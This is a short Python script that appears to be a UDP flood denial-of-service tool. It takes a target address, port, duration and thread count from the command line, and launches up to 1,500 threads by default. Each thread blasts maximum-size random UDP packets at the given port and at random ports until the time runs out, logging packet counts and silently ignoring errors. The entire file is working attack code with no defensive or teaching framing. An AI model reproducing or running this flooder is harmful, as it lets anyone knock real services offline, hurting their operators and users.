#!/usr/bin/env python3
import socket, random, time, threading, sys

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 1500

def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                p = random._urandom(65507)
                s.sendto(p, (target, port))
                s.sendto(p, (target, random.randint(1, 65535)))
                count += 2
                if count % 10000 == 0:
                    sys.stderr.write(f"GUDP: {count} packets\n")
            except:
                pass
        s.close()
        sys.stderr.write(f"GUDP completed: {count} packets\n")
    except:
        pass

for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
